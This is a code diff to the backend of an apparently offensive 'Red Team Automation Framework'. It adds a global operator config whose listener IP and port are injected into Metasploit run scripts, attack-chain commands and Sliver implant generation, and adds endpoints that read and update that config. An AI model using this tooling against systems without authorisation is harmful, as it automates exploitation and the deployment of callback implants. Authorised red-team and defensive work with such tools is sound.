@@ -936,13 +936,15 @@ async def run_tool(tool_id: str, target: str) -> Dict[str, Any]:
         return {"error": str(e)}
 
 async def run_metasploit(module: str, target: str, port: Optional[int], options: Dict, lhost: str = None, lport: int = 4444) -> Dict[str, Any]:
+    effective_lhost = lhost or get_effective_lhost()
+    effective_lport = lport or global_config.get("listener_port", 4444)
     rc_content = f"use {module}\nset RHOSTS {target}\n"
     if port:
         rc_content += f"set RPORT {port}\n"
-    if lhost:
-        rc_content += f"set LHOST {lhost}\n"
-    if lport:
-        rc_content += f"set LPORT {lport}\n"
+    if effective_lhost:
+        rc_content += f"set LHOST {effective_lhost}\n"
+    if effective_lport:
+        rc_content += f"set LPORT {effective_lport}\n"
     rc_content += "run\nexit\n"
     
     try:
@@ -1011,6 +1013,7 @@ Responde en español, sé conciso y táctico."""
         return {"analysis": f"Error: {str(e)}", "exploits": []}
 
 def build_attack_tree(scan_id: str, target: str, results: Dict, phases: List[str], ai_data: Dict, tactical: Dict) -> Dict[str, Any]:
+    tactical = tactical or {}
     tree = {
         "scan_id": scan_id,
         "root": {"id": "root", "type": "target", "name": target, "description": f"Target: {target}", "status": "testing", "children": []},
@@ -1021,7 +1024,7 @@ def build_attack_tree(scan_id: str, target: str, results: Dict, phases: List[str
     node_id = 0
     
     # Add tactical decisions as priority nodes
-    if tactical.get("waf_analysis", {}).get("waf_detected"):
+    if (tactical.get("waf_analysis") or {}).get("waf_detected"):
         node_id += 1
         waf_node_id = f"waf_{node_id}"
         tree["nodes"][waf_node_id] = {
@@ -1094,6 +1097,28 @@ from modules.session_manager import SessionManager
 credential_vault = CredentialVault()
 session_manager = SessionManager()
 
+# Global operator config (persisted in MongoDB)
+global_config: Dict[str, Any] = {
+    "listener_ip": "",
+    "listener_port": 4444,
+    "c2_protocol": "tcp",
+    "operator_name": "operator",
+    "stealth_mode": False,
+    "auto_lhost": True,  # Auto-inject LHOST into all payloads
+}
+
+async def load_global_config():
+    """Load global config from DB on startup"""
+    global global_config
+    doc = await db.global_config.find_one({"_id": "operator_config"})
+    if doc:
+        doc.pop("_id", None)
+        global_config.update(doc)
+
+def get_effective_lhost() -> str:
+    """Get the effective LHOST from global config"""
+    return global_config.get("listener_ip", "") or ""
+
 # Adaptive scan config
 SCAN_LIMITS = {
     "max_tools": 20,
@@ -1118,8 +1143,9 @@ async def run_scan_background(scan_id: str, target: str, phases: List[str], tool
         "timeline": [], "vault_summary": {}, "adaptive_log": []
     }
     
-    # Initialize vault context
-    credential_vault.update_context(scan_id, target=target, lhost="")
+    # Initialize vault context - use global LHOST
+    effective_lhost = get_effective_lhost()
+    credential_vault.update_context(scan_id, target=target, lhost=effective_lhost)
     
     # Phase 1: Build initial tool queue from phases
     initial_tools = tools or [t for t, info in RED_TEAM_TOOLS.items() if info["phase"] in phases]
@@ -1416,7 +1442,32 @@ def get_recommended_modules(results: Dict, tactical: Dict) -> List[Dict]:
 # =============================================================================
 @api_router.get("/")
 async def root():
-    return {"message": "Red Team Automation Framework", "version": "3.1.0", "features": ["tactical_engine", "adaptive_planning", "waf_bypass"]}
+    return {"message": "Red Team Automation Framework", "version": "5.0.0", "features": ["tactical_engine", "adaptive_planning", "waf_bypass", "global_config"]}
+
+# ============ GLOBAL CONFIG ENDPOINTS ============
+
+@api_router.get("/config")
+async def get_config():
+    """Get global operator configuration"""
+    return {**global_config}
+
+@api_router.put("/config")
+async def update_config(data: Dict[str, Any]):
+    """Update global operator configuration"""
+    global global_config
+    allowed_keys = {"listener_ip", "listener_port", "c2_protocol", "operator_name", "stealth_mode", "auto_lhost"}
+    updates = {k: v for k, v in data.items() if k in allowed_keys}
+    global_config.update(updates)
+    await db.global_config.update_one(
+        {"_id": "operator_config"},
+        {"$set": global_config},
+        upsert=True
+    )
+    return {"status": "updated", "config": {**global_config}}
+
+@app.on_event("startup")
+async def startup_event():
+    await load_global_config()
 
 @api_router.get("/mitre/tactics")
 async def get_mitre_tactics():
@@ -1820,7 +1871,8 @@ async def execute_chain(request: ChainExecutionRequest, background_tasks: Backgr
         raise HTTPException(status_code=404, detail="Chain not found")
     
     execution_id = str(uuid.uuid4())
-    context = {"target": request.target, "lhost": request.context.get("lhost", ""), **request.context}
+    effective_lhost = request.context.get("lhost", "") or get_effective_lhost()
+    context = {"target": request.target, "lhost": effective_lhost, **request.context, "lhost": effective_lhost}
     commands = AttackChainEngine.generate_chain_commands(request.chain_id, context)
     
     # Build initial step statuses
@@ -2329,11 +2381,13 @@ async def sliver_implants():
 @api_router.post("/sliver/implant/generate")
 async def sliver_generate_implant(data: Dict[str, Any]):
     """Generate a Sliver implant"""
+    effective_lhost = data.get("lhost") or get_effective_lhost() or "127.0.0.1"
+    effective_lport = data.get("lport") or global_config.get("listener_port", 443)
     return await sliver_module.generate_implant(
         SLIVER_CONFIG_PATH,
         name=data.get("name", "implant"),
-        lhost=data.get("lhost", "127.0.0.1"),
-        lport=data.get("lport", 443),
+        lhost=effective_lhost,
+        lport=effective_lport,
         os_target=data.get("os", "linux"),
         arch=data.get("arch", "amd64"),
         implant_type=data.get("type", "session"),
